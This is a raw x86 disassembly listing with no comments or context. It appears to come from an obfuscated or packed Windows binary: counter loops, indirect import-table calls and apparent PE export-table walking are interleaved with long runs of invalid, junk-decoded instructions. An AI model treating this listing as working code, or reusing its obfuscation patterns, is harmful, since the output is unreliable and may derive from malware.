  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ch,BYTE PTR [edx]
  40ebb4:	mov    ds:0xa59a0f43,al
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec26
  40ebc0:	mov    bh,BYTE PTR [ecx]
  40ebc2:	and    eax,0x3446014
  40ebc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc8:	sbb    bh,BYTE PTR [edi]
  40ebca:	aam    0xd0
  40ebcc:	jmp    0xc2fa:0xf7b4467a
  40ebd3:	int3   
  40ebd4:	dec    ecx
  40ebd5:	test   eax,0x683a780
  40ebda:	jo     0x40ebf9
  40ebdc:	or     al,BYTE PTR [ecx+0x65]
  40ebdf:	mul    eax
  40ebe1:	mov    bh,0xd0
  40ebe3:	rcl    esp,1
  40ebe5:	mov    WORD PTR [ecx-0x137bf93a],cs
  40ebeb:	sub    al,0x96
  40ebed:	jmp    0xc6c3:0x43fdf9ba
  40ebf4:	fisttp DWORD PTR [ecx+0xaa0f586]
  40ebfa:	mov    ah,0xd9
  40ebfc:	fst    QWORD PTR [ebp+0x20f869b8]
  40ec02:	vpmacsdql xmm9,xmm5,XMMWORD PTR [edx-0x5b],xmm6
  40ec09:	daa    
  40ec0a:	mov    ch,0x8c
  40ec0c:	clc    
  40ec0d:	ins    BYTE PTR es:[edi],dx
  40ec0e:	test   al,ah
  40ec10:	mov    ebx,0x59efae57
  40ec15:	mov    dl,0xff
  40ec17:	or     ebx,edi
  40ec19:	aam    0x51
  40ec1b:	stos   DWORD PTR es:[edi],eax
  40ec1c:	jne    0x40ebd1
  40ec1e:	sbb    dh,BYTE PTR [ecx-0x2e37b37b]
  40ec24:	sbb    eax,0x4149c73a
  40ec29:	popa   
  40ec2a:	scas   al,BYTE PTR es:[edi]
  40ec2b:	inc    edi
  40ec2c:	pop    eax
  40ec2d:	shr    BYTE PTR [edx+0x9432a14],1
  40ec33:	mov    ds:0x31481667,eax
  40ec38:	pop    es
  40ec39:	into   
  40ec3a:	pop    ebp
  40ec3b:	and    eax,0xa48cde19
  40ec40:	hlt    
  40ec41:	fstp   DWORD PTR [ebx]
  40ec43:	test   DWORD PTR [edi-0x1d0799a8],esp
  40ec49:	add    DWORD PTR [eax-0x51],ecx
  40ec4c:	push   0x7e1e7000
  40ec51:	xchg   edx,eax
  40ec52:	stos   BYTE PTR es:[edi],al
  40ec53:	retf   0x1da6
  40ec56:	js     0x40ec0c
  40ec58:	and    eax,0x25bc3123
  40ec5d:	aaa    
  40ec5e:	mov    bl,0x38
  40ec60:	cwde   
  40ec61:	ja     0x40ec8e
  40ec63:	mov    edx,DWORD PTR [esi+0xa]
  40ec66:	fcmovbe st,st(1)
  40ec68:	int    0xa
  40ec6a:	push   ds
  40ec6b:	pop    esp
  40ec6c:	test   BYTE PTR [ebx],dh
  40ec6e:	mov    bh,0x8c
  40ec70:	inc    esi
  40ec71:	stc    
  40ec72:	and    al,0xc4
  40ec74:	push   0x3e8944d0
  40ec79:	xchg   ecx,eax
  40ec7a:	mov    eax,0x2883fea
  40ec7f:	lahf   
  40ec80:	push   ebp
  40ec81:	add    ah,ch
  40ec83:	hlt    
  40ec84:	xor    DWORD PTR [ebx],esi
  40ec86:	pushf  
  40ec87:	std    
  40ec88:	jnp    0x40ec8a
  40ec8a:	call   0x64823361
  40ec8f:	xor    DWORD PTR [edx+0x3e],ebp
  40ec92:	xchg   esi,eax
  40ec93:	stos   BYTE PTR es:[edi],al
  40ec94:	sbb    BYTE PTR [ebx],0xa2
  40ec97:	imul   esp,DWORD PTR [edi-0x28d84ad1],0x20
  40ec9e:	jno    0x40eca7
  40eca0:	stos   DWORD PTR es:[edi],eax
  40eca1:	stos   DWORD PTR es:[edi],eax
  40eca2:	inc    BYTE PTR [ebp+esi*1+0x68725c19]
  40eca9:	jo     0x40ec2d
  40ecab:	loope  0x40ecc0
  40ecad:	pusha  
  40ecae:	mov    BYTE PTR [eax+0x615e41f],ah
  40ecb4:	(bad)  
  40ecb5:	fs in  eax,dx
  40ecb7:	mov    bl,0xab
  40ecb9:	sti    
  40ecba:	test   ch,bh
  40ecbc:	dec    ebx
  40ecbd:	cwde   
  40ecbe:	out    0x59,al
  40ecc0:	scas   al,BYTE PTR es:[edi]
  40ecc1:	fsub   st,st(6)
  40ecc3:	xor    esp,DWORD PTR gs:[ecx+ebp*8+0x38aaf3c8]
  40eccb:	lds    ebp,FWORD PTR [esp+eiz*8+0x69]
  40eccf:	xor    DWORD PTR [edx+eax*1-0x742f90b5],0x4
  40ecd7:	xchg   ecx,eax
  40ecd8:	out    0x7,eax
  40ecda:	into   
  40ecdb:	ffree  st(3)
  40ecdd:	mov    ecx,0x4fc8073f
  40ece2:	jecxz  0x40ed06
  40ece4:	pop    edx
  40ece5:	int    0xe
  40ece7:	or     DWORD PTR [esi+0x272bf223],ecx
  40eced:	outs   dx,DWORD PTR ds:[esi]
  40ecee:	shl    DWORD PTR [ebx-0x763fb6ff],cl
  40ecf4:	stos   BYTE PTR es:[edi],al
  40ecf5:	sar    esi,1
  40ecf7:	mov    ebx,0xb57d7b5f
  40ecfc:	int    0xa4
  40ecfe:	adc    DWORD PTR [esi-0x6378eb12],ebx
  40ed04:	mov    eax,0xbe2ddb4
  40ed09:	xlat   BYTE PTR ds:[ebx]
  40ed0a:	scas   al,BYTE PTR es:[edi]
  40ed0b:	jae    0x40ed2b
  40ed0d:	jmp    0x3594:0x6d81f91c
  40ed14:	or     DWORD PTR [ebx+0xf],esi
  40ed17:	mov    dl,0x3b
  40ed19:	xlat   BYTE PTR ds:[ebx]
  40ed1a:	push   ds
  40ed1b:	es out 0x45,eax
  40ed1e:	aaa    
  40ed1f:	push   ebp
  40ed20:	jecxz  0x40ed60
  40ed22:	and    ah,al
  40ed24:	push   ebp
  40ed25:	sbb    al,0x64
  40ed27:	xchg   edi,eax
  40ed28:	nop
  40ed29:	xor    DWORD PTR [eax-0x6f2c902c],edx
  40ed2f:	retf   0xc1c9
  40ed32:	mov    ?,WORD PTR [edi+0x4c]
  40ed35:	loop   0x40ed72
  40ed37:	das    
  40ed38:	test   al,0x1f
  40ed3a:	push   cs
  40ed3b:	cmp    bl,BYTE PTR [eax]
  40ed3d:	into   
  40ed3e:	sub    eax,0x597f7754
  40ed43:	dec    edi
  40ed44:	jg     0x40eda0
  40ed46:	dec    ebx
  40ed47:	pop    ss
  40ed48:	mov    al,0x3d
  40ed4a:	mov    ebx,0x47e39de0
  40ed4f:	mov    eax,ds:0x7830b8c8
  40ed54:	call   0x19bf9ea6
  40ed59:	jmp    0x40ecf1
  40ed5b:	jbe    0x40ed3e
  40ed5d:	fadd   DWORD PTR [eax+ecx*2]
  40ed60:	mov    ah,0xef
  40ed62:	or     esp,DWORD PTR [eax+0x5c]
  40ed65:	mov    ds:0xb7d7b559,al
  40ed6a:	pop    esi
  40ed6b:	adc    dh,BYTE PTR [edx+0x31]
  40ed6e:	jae    0x40ecfc
  40ed70:	ror    BYTE PTR [ebx+0x537c146e],1
  40ed76:	pop    es
  40ed77:	pop    ebx
  40ed78:	stos   DWORD PTR es:[edi],eax
  40ed79:	test   BYTE PTR [edi],dh
  40ed7b:	cmp    eax,0x3733dba9
  40ed80:	arpl   WORD PTR [ebp+0x78b34379],ax
  40ed86:	dec    esi
  40ed87:	push   ss
  40ed88:	and    BYTE PTR [edi],ch
  40ed8a:	std    
  40ed8b:	(bad)  
  40ed8c:	icebp  
  40ed8d:	cmc    
  40ed8e:	xchg   BYTE PTR [edx-0x23],ch
  40ed91:	xor    ah,BYTE PTR [edi+0x17]
  40ed94:	std    
  40ed95:	push   0x33bf9943
  40ed9a:	ret    0xd2b
  40ed9d:	push   ebx
  40ed9e:	aaa    
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x126dc64]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	das    
  40ee77:	hlt    
  40ee78:	out    0x30,al
  40ee7a:	adc    eax,0x38361cfc
  40ee7f:	add    DWORD PTR [eax+0x5aa4a3c9],esp
  40ee85:	jns    0x40eef1
  40ee87:	stc    
  40ee88:	xor    cl,BYTE PTR [esi-0x771cf0a1]
  40ee8e:	pop    esp
  40ee8f:	aad    0x8a
  40ee91:	pop    ebx
  40ee92:	jmp    0xd093:0x68718655
  40ee99:	sub    BYTE PTR [edi+0x5fa287fc],ch
  40ee9f:	pop    es
  40eea0:	fist   WORD PTR [ebx+ecx*4+0x7f0341e2]
  40eea7:	aas    
  40eea8:	test   BYTE PTR [edx],ah
  40eeaa:	nop
  40eeab:	jmp    0x40eeba
  40eead:	dec    bh
  40eeaf:	jge    0x40eeaf
  40eeb1:	mov    ?,ebx
  40eeb3:	cmp    esp,DWORD PTR [eax]
  40eeb5:	jae    0x40eef5
  40eeb7:	jle    0x40eeb8
  40eeb9:	mov    ss,WORD PTR [ebp+0xcd7da82]
  40eebf:	cmp    al,0x3e
  40eec1:	sub    bl,0x5
  40eec4:	ja     0x40eed8
  40eec6:	jb     0x40eeeb
  40eec8:	shl    esi,0x9d
  40eecb:	cmp    BYTE PTR [ecx],0xa6
  40eece:	push   cs
  40eecf:	(bad)  
  40eed0:	cmp    edi,ecx
  40eed2:	mov    eax,ds:0xdc943011
  40eed7:	mov    ?,WORD PTR [eax+0x1c]
  40eeda:	mov    eax,fs
  40eedc:	jns    0x40eea0
  40eede:	add    al,0xcc
  40eee0:	ins    BYTE PTR es:[edi],dx
  40eee1:	call   0x963c:0x85abadbb
  40eee8:	leave  
  40eee9:	int    0x1f
  40eeeb:	mov    cl,0x33
  40eeed:	xor    DWORD PTR [ecx],0x6c
  40eef0:	cmp    eax,0x10d58c6a
  40eef5:	jne    0x40eed0
  40eef7:	or     cl,dl
  40eef9:	pop    eax
  40eefa:	mov    al,ds:0x60af626a
  40eeff:	pop    esi
  40ef00:	loope  0x40ee8c
  40ef02:	jecxz  0x40eeac
  40ef04:	repz cmp eax,DWORD PTR [esi]
  40ef07:	jg     0x40ef1a
  40ef09:	or     dh,BYTE PTR [eax-0x5263c1d2]
  40ef0f:	mov    ebp,0x6945e4b4
  40ef14:	jmp    0x1f6898de
  40ef19:	add    BYTE PTR [ecx-0x39256da9],ch
  40ef1f:	lahf   
  40ef20:	sub    ebx,edx
  40ef22:	shr    ah,1
  40ef24:	outs   dx,BYTE PTR ds:[esi]
  40ef25:	fstp   TBYTE PTR [eax-0x132db3bc]
  40ef2b:	pop    ss
  40ef2c:	jnp    0x40ef77
  40ef2e:	mov    bl,dh
  40ef30:	fld    DWORD PTR [ebp+0x667babcd]
  40ef36:	stos   BYTE PTR es:[edi],al
  40ef37:	cmp    al,0xe6
  40ef39:	leave  
  40ef3a:	shl    DWORD PTR [esi+0x23f499ab],cl
  40ef40:	sbb    eax,0x495c597a
  40ef45:	ins    DWORD PTR es:[edi],dx
  40ef46:	ficomp WORD PTR [eax+ebx*2]
  40ef49:	aaa    
  40ef4a:	outs   dx,DWORD PTR ds:[esi]
  40ef4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef4c:	rol    BYTE PTR [esi+0x33],cl
  40ef4f:	pop    edx
  40ef50:	retf   
  40ef51:	mov    ebp,0x2c9f7aa9
  40ef56:	and    ah,BYTE PTR ds:0x38d3e535
  40ef5c:	stos   DWORD PTR es:[edi],eax
  40ef5d:	push   ds
  40ef5e:	mov    cl,0x7b
  40ef60:	popf   
  40ef61:	fst    QWORD PTR [esi+0x7e]
  40ef64:	ret    
  40ef65:	push   0xfffffff5
  40ef67:	jne    0x40efd5
  40ef69:	adc    eax,0x11a2fcc0
  40ef6e:	jnp    0x40ef9a
  40ef70:	push   0xffffffda
  40ef72:	pop    bx
  40ef74:	pop    ss
  40ef75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef76:	dec    ebp
  40ef77:	sbb    DWORD PTR [edi-0x47973b44],edx
  40ef7d:	xor    edi,DWORD PTR [ecx-0x2e]
  40ef80:	mov    esp,0x2223dc4b
  40ef85:	ror    BYTE PTR ds:0x173c9f0a,1
  40ef8b:	inc    esi
  40ef8c:	ins    DWORD PTR es:[edi],dx
  40ef8d:	dec    ecx
  40ef8e:	fwait
  40ef8f:	ja     0x40efae
  40ef91:	cmp    esp,DWORD PTR [esi+0x7e]
  40ef94:	cs jne 0x40ef52
  40ef97:	sub    al,0xf3
  40ef99:	mov    DWORD PTR [ecx-0x4a1e597f],eax
  40ef9f:	mov    edi,0x17c76118
  40efa4:	fidiv  WORD PTR [ebx]
  40efa6:	push   0x72a05584
  40efab:	sub    DWORD PTR [esi],eax
  40efad:	sbb    eax,DWORD PTR [ebx+0x6b]
  40efb0:	mov    ebx,0x32ad50c8
  40efb5:	xor    al,0xaf
  40efb7:	add    DWORD PTR [ebp+0x6],edx
  40efba:	and    eax,esi
  40efbc:	sbb    DWORD PTR [esi-0x45b6eb97],ebp
  40efc2:	push   esp
  40efc3:	add    eax,0x133794d7
  40efc8:	imul   eax,DWORD PTR [eax-0x2d],0xaae735d5
  40efcf:	push   ds
  40efd0:	inc    esp
  40efd1:	push   esi
  40efd2:	retf   0x30c8
  40efd5:	in     al,dx
  40efd6:	fdiv   QWORD PTR [esi]
  40efd8:	idiv   DWORD PTR [ecx]
  40efda:	lock dec edi
  40efdc:	call   0xa9ec8abf
  40efe1:	add    ah,BYTE PTR [edi+0x34]
  40efe4:	sub    al,0x2
  40efe6:	cld    
  40efe7:	gs jnp 0x40f011
  40efea:	or     edi,edx
  40efec:	pop    es
  40efed:	outs   dx,BYTE PTR ds:[esi]
  40efee:	and    eax,0xa3c989a4
  40eff3:	and    BYTE PTR [edx-0x5b77d391],0x58
  40effa:	pop    DWORD PTR [edx+esi*8]
  40effd:	mov    esi,0x5fabfd9c
  40f002:	jmp    0x887a61ee
  40f007:	push   ebp
  40f008:	adc    esi,DWORD PTR ds:0x77639633
  40f00e:	jae    0x40f03d
  40f010:	cmp    cl,dh
  40f012:	sbb    BYTE PTR [eax+0x6370eaa4],0x4f
  40f019:	stos   BYTE PTR es:[edi],al
  40f01a:	sbb    eax,esi
  40f01c:	mov    dl,0x3c
  40f01e:	test   al,0xbc
  40f020:	cmc    
  40f021:	mov    gs,WORD PTR [ecx]
  40f023:	cmp    eax,0x4b085f02
  40f028:	(bad)  
  40f029:	idiv   DWORD PTR [ebp-0x6a1385b6]
  40f02f:	rol    DWORD PTR [eax+ecx*2-0x33573632],cl
  40f036:	add    BYTE PTR ds:0x68e588e2,0x62
  40f03d:	jl     0x40f025
  40f03f:	fstp   TBYTE PTR [ecx+edx*4+0x3b]
  40f043:	push   ecx
  40f044:	in     eax,dx
  40f045:	inc    edi
  40f046:	pop    esi
  40f047:	aam    0x87
  40f049:	xor    esp,eax
  40f04b:	jge    0x40f09e
  40f04d:	dec    eax
  40f04e:	mov    dh,0xdf
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x800b1594,ebx
  40f076:	arpl   WORD PTR [edx+0x7e7ea1d6],di
  40f07c:	jl     0x40f0fb
  40f07e:	jle    0x40f0fe
  40f080:	pop    ecx
  40f081:	jns    0x40f0f9
  40f083:	repz mov esi,0x6592bbe6
  40f089:	xchg   esi,eax
  40f08a:	xor    ecx,0x49
  40f08d:	push   ss
  40f08e:	cmc    
  40f08f:	inc    edx
  40f090:	dec    ebx
  40f091:	call   FWORD PTR [ebx-0x2c]
  40f094:	stos   DWORD PTR es:[edi],eax
  40f095:	mov    ebx,0x1e4f9984
  40f09a:	xchg   ebx,eax
  40f09b:	addr16 repnz mov al,0xbb
  40f09f:	dec    edi
  40f0a0:	push   ebx
  40f0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a2:	mov    bh,0x63
  40f0a4:	push   cs
  40f0a5:	dec    edx
  40f0a6:	shr    BYTE PTR [edx-0x2b],1
  40f0a9:	dec    ecx
  40f0aa:	sub    BYTE PTR [ecx-0x533e41c],bh
  40f0b0:	push   ecx
  40f0b1:	adc    BYTE PTR [edi+0x30],ch
  40f0b4:	dec    ebp
  40f0b5:	pop    ss
  40f0b6:	jno    0x40f0c4
  40f0b8:	mov    al,ds:0x78bfd4e3
  40f0bd:	dec    eax
  40f0be:	inc    edi
  40f0bf:	fstp   st(2)
  40f0c1:	and    BYTE PTR [eax+0xe0093d9],dh
  40f0c7:	and    edi,DWORD PTR [eax]
  40f0c9:	add    esi,DWORD PTR [ebx+edi*1+0x7d]
  40f0cd:	aam    0x95
  40f0cf:	cmp    ebp,0x41
  40f0d2:	(bad)  
  40f0d3:	aad    0x97
  40f0d5:	add    ebp,DWORD PTR [eax-0x648f42f3]
  40f0db:	dec    edx
  40f0dc:	shl    dl,cl
  40f0de:	mov    edx,0x22467732
  40f0e3:	push   esp
  40f0e4:	rcl    esp,cl
  40f0e6:	push   eax
  40f0e7:	and    ebx,DWORD PTR [esp+ebp*4+0x63]
  40f0eb:	pop    ebp
  40f0ec:	mov    edi,0x1dd1d90
  40f0f1:	iret   
  40f0f2:	sub    eax,0x986fbc9d
  40f0f7:	das    
  40f0f8:	loopne 0x40f0ec
  40f0fa:	stc    
  40f0fb:	xor    DWORD PTR es:[ecx-0x4d],edi
  40f0ff:	pop    esi
  40f100:	ror    BYTE PTR es:[ebp+0x3c],0x4c
  40f105:	pop    ss
  40f106:	(bad)  
  40f107:	ins    BYTE PTR es:[edi],dx
  40f108:	(bad)  
  40f109:	sbb    BYTE PTR ds:0xa2bab48d,cl
  40f10f:	or     al,0x14
  40f111:	out    dx,al
  40f112:	iret   
  40f113:	and    eax,0xf4a22f1d
  40f118:	push   ds
  40f119:	inc    ebp
  40f11a:	mov    bh,0x8b
  40f11c:	or     ebp,DWORD PTR [eax-0x52b24908]
  40f122:	xchg   esi,eax
  40f123:	cs hlt 
  40f125:	sub    eax,0x78bdc083
  40f12a:	cmp    DWORD PTR [ecx],ecx
  40f12c:	mov    cs,WORD PTR [eax-0x6acda5f2]
  40f132:	dec    eax
  40f133:	(bad)  
  40f134:	repz dec esp
  40f136:	adc    eax,0xd1df6acd
  40f13b:	test   DWORD PTR [edx+eiz*1+0x3d],edx
  40f13f:	mov    ds:0x7c17dea7,eax
  40f144:	cdq    
  40f145:	adc    eax,DWORD PTR [edi]
  40f147:	fdivr  DWORD PTR [eax-0x3]
  40f14a:	pop    ebp
  40f14b:	pop    ebp
  40f14c:	jl     0x40f1c7
  40f14e:	inc    ecx
  40f14f:	mov    ecx,0x55075a43
  40f154:	jae    0x40f16b
  40f156:	jne    0x40f11e
  40f158:	imul   edx,DWORD PTR [ecx+ecx*1],0x95df1102
  40f15f:	dec    edx
  40f160:	popa   
  40f161:	icebp  
  40f162:	add    ebp,esp
  40f164:	in     eax,dx
  40f165:	jnp    0x40f180
  40f167:	or     DWORD PTR [ecx],ebx
  40f169:	shl    DWORD PTR [esi-0x3fb320e9],cl
  40f16f:	push   0xffffffc0
  40f171:	std    
  40f172:	mov    DWORD PTR [ebp+0x6ac80a7e],0x668100a3
  40f17c:	xor    ebp,DWORD PTR [eax-0x5fd7423c]
  40f182:	add    al,0xa4
  40f184:	into   
  40f185:	push   esi
  40f186:	test   al,0x69
  40f188:	mov    ah,0x29
  40f18a:	xchg   esi,eax
  40f18b:	dec    ch
  40f18d:	ja     0x40f205
  40f18f:	dec    ebx
  40f190:	ss sbb al,0x61
  40f193:	pop    esi
  40f194:	rol    ah,0xf6
  40f197:	(bad)  
  40f198:	push   ebp
  40f199:	pop    edx
  40f19a:	fwait
  40f19b:	mov    ds:0x7b1b1118,eax
  40f1a0:	clc    
  40f1a1:	fist   DWORD PTR [ebx+0x407939d5]
  40f1a7:	xor    BYTE PTR [esi-0x3bc71c2b],bh
  40f1ad:	leave  
  40f1ae:	cmc    
  40f1af:	xchg   DWORD PTR [esi],esp
  40f1b1:	jg     0x40f1b9
  40f1b3:	sti    
  40f1b4:	or     BYTE PTR [edi+esi*1],bh
  40f1b7:	fist   DWORD PTR [ebp-0x23f45009]
  40f1bd:	and    ch,BYTE PTR [eax]
  40f1bf:	inc    ebx
  40f1c0:	jmp    0x76fb:0x9bd602d3
  40f1c7:	cld    
  40f1c8:	rol    DWORD PTR [ebp+0x29],0x7d
  40f1cc:	bound  ebx,QWORD PTR [edi]
  40f1ce:	adc    al,0x39
  40f1d0:	sbb    DWORD PTR [edi],0xffffffd9
  40f1d3:	dec    edx
  40f1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1d5:	dec    ebp
  40f1d6:	dec    edi
  40f1d7:	aaa    
  40f1d8:	shr    BYTE PTR [edi+0x7f5f638a],cl
  40f1de:	cmp    BYTE PTR [esi+0x79],bl
  40f1e1:	jle    0x40f249
  40f1e3:	iret   
  40f1e4:	mov    esp,0x7a8ad0db
  40f1e9:	adc    al,0x17
  40f1eb:	les    edx,FWORD PTR [bp+0x15]
  40f1ef:	push   ebx
  40f1f0:	mov    ?,WORD PTR [ebx+0x554bd694]
  40f1f6:	dec    ebx
  40f1f7:	fcmove st,st(2)
  40f1f9:	push   ebp
  40f1fa:	pop    esp
  40f1fb:	iret   
  40f1fc:	inc    ebx
  40f1fd:	ficom  WORD PTR [eax-0x2]
  40f200:	or     eax,0x8f038692
  40f205:	cld    
  40f206:	inc    ecx
  40f207:	and    ebp,0xffffff88
  40f20a:	(bad)  
  40f20b:	shr    BYTE PTR [esi],0x1d
  40f20e:	mov    DWORD PTR [eax+edx*1],ebp
  40f211:	ret    
  40f212:	cli    
  40f213:	cli    
  40f214:	cmp    eax,0xa928b709
  40f219:	cwde   
  40f21a:	jo     0x40f1b1
  40f21c:	ins    BYTE PTR es:[edi],dx
  40f21d:	dec    edi
  40f21e:	add    edi,DWORD PTR [edx+0x6cc4fe66]
  40f224:	pop    ds
  40f225:	add    BYTE PTR [edx+0x33],bl
  40f228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f229:	inc    ebp
  40f22a:	xor    DWORD PTR ds:0xc4337886,edx
  40f230:	cmp    bh,BYTE PTR [eax-0x22de69e1]
  40f236:	mov    DWORD PTR [edi],0x3ac83969
  40f23c:	mov    bl,0xba
  40f23e:	in     al,0x30
  40f240:	test   ebx,edx
  40f242:	(bad)  
  40f243:	dec    ebp
  40f244:	loop   0x40f24d
  40f246:	shr    cl,0xc6
  40f249:	push   0x52
  40f24b:	adc    al,0xc3
  40f24d:	mov    edi,0xa13fdfc7
  40f252:	inc    esi
  40f253:	xor    BYTE PTR [ecx+0x5c4be5b],0xa
  40f25a:	mov    edi,0x361e088e
  40f25f:	mov    ss,WORD PTR [esi-0x7d3bdaa3]
  40f265:	pushf  
  40f266:	inc    esi
  40f268:	xchg   ebp,eax
  40f269:	(bad)  
  40f26a:	scas   eax,DWORD PTR es:[edi]
  40f26b:	cmp    cl,BYTE PTR [ebx+0x70bb61f7]
  40f271:	cld    
  40f272:	mov    eax,0xa2c35363
  40f277:	aam    0x9d
  40f279:	daa    
  40f27a:	int3   
  40f27b:	mov    BYTE PTR ds:0x2dc1a7ae,dh
  40f281:	ss dec esi
  40f283:	push   ebp
  40f284:	push   cs
  40f285:	mov    al,ds:0x8ed31c5a
  40f28a:	es call 0x678c3257
  40f290:	cmp    BYTE PTR es:[esi+0x0],cl
  40f294:	fidiv  DWORD PTR [ecx+0x2f]
  40f297:	jmp    FWORD PTR [ecx+ebp*4-0x69]
  40f29b:	iret   
  40f29c:	fisub  DWORD PTR [ecx]
  40f29e:	call   0x8bbc1360
  40f2a3:	and    edi,DWORD PTR [ebp-0x417a5900]
  40f2a9:	jnp    0x40f30f
  40f2ab:	jnp    0x40f233
  40f2ad:	mov    edx,0xba550f7
  40f2b2:	fistp  DWORD PTR [esi+0x56]
  40f2b5:	test   eax,0xd9a02dd6
  40f2ba:	pop    edi
  40f2bb:	aad    0xc5
  40f2bd:	cdq    
  40f2be:	pop    esi
  40f2bf:	ins    BYTE PTR es:[edi],dx
  40f2c0:	jmp    0xc47350a3
  40f2c5:	push   ds
  40f2c6:	push   0xd30d9a21
  40f2cb:	pop    esp
  40f2cc:	nop
  40f2cd:	div    DWORD PTR [ebx+0x5deb64]
  40f2d3:	cmc    
  40f2d4:	pop    ebp
  40f2d5:	or     ah,dh
  40f2d7:	pop    esi
  40f2d8:	aas    
  40f2d9:	int3   
  40f2da:	enter  0x3d45,0xf0
  40f2de:	or     DWORD PTR ss:[ecx],eax
  40f2e1:	pop    ss
  40f2e2:	push   esp
  40f2e3:	cmp    DWORD PTR [ebp-0x72],edi
  40f2e6:	stos   BYTE PTR es:[edi],al
  40f2e7:	push   edx
  40f2e8:	enter  0xec8a,0xc3
  40f2ec:	dec    edx
  40f2ed:	packuswb mm5,QWORD PTR [eax]
  40f2f0:	daa    
  40f2f1:	fimul  DWORD PTR [ecx]
  40f2f3:	pop    ss
  40f2f4:	inc    ebp
  40f2f5:	mov    edi,0xc9b17014
  40f2fa:	test   BYTE PTR [eax],0xb5
  40f2fd:	shl    BYTE PTR [edi],1
  40f2ff:	imul   DWORD PTR [edx]
  40f301:	dec    ecx
  40f302:	je     0x40f37d
  40f304:	iret   
  40f305:	jnp    0x40f332
  40f307:	call   0x72e921e6
  40f30c:	or     DWORD PTR [edi+0x3e9a259e],edx
  40f312:	cmp    esp,DWORD PTR [esi-0x55fcfc8]
  40f318:	outs   dx,DWORD PTR ds:[esi]
  40f319:	and    al,0xe5
  40f31b:	clc    
  40f31c:	adc    eax,0xc0362233
  40f321:	inc    ebp
  40f322:	pop    ebp
  40f323:	cdq    
  40f324:	retf   
  40f325:	dec    ebp
  40f326:	xchg   edx,eax
  40f327:	ja     0x40f398
